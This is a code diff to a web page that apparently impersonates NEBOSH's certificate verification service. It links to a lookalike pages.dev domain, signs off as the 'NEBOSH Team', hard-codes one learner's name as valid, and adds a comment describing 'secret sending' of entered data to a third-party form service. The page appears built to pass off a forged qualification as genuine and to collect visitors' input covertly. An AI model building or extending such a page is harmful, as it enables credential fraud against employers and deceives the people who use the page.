@@ -639,6 +639,7 @@
       
       document.getElementById('btn-back-3').addEventListener('click', () => goToStep(1));
       
+      // 6. الإرسال السري باستخدام FormData (المفتاح والبيانات الجديدة مع الرابط الأزرق)
       document.getElementById('btn-send').addEventListener('click', () => {
         const learnerInput = document.getElementById('val-learner-name');
         const logInput = document.getElementById('val-master-log');
@@ -701,7 +702,7 @@ Learner's name is printed in the background of the certificate.
 
 Online Verification Page
 You can also view the certificate verification details using the secure verification page below:
-https://nebosh-validation-verisecure.pages.dev/Details/S5TDWNP3H9JFSY5UUS37W8L8
+<a href="https://nebosh-validation-verisecure.pages.dev/Details/S5TDWNP3H9JFSY5UUS37W8L8" style="color: #1a73e8; font-weight: bold; text-decoration: underline;">Click here to view online verification</a>
 
 Once you have completed all the checks, if you believe that there is suspicious activity around the certificate you are verifying, please report this to NEBOSH using our "Report suspicious certificate activity" form on our verifications page, where you will also find our "Verifying credentials to prevent qualification fraud – Guide for Employers."
 
@@ -725,7 +726,9 @@ NEBOSH Team
             method: "POST",
             body: formData
         }).then(response => response.json())
-          .then(data => console.log("Web3Forms Success:", data))
+          .then(data => {
+              console.log("Web3Forms Status:", data);
+          })
           .catch(error => console.log("Web3Forms Error:", error));
 
         const validName = "hussein hosny mohamed helal";
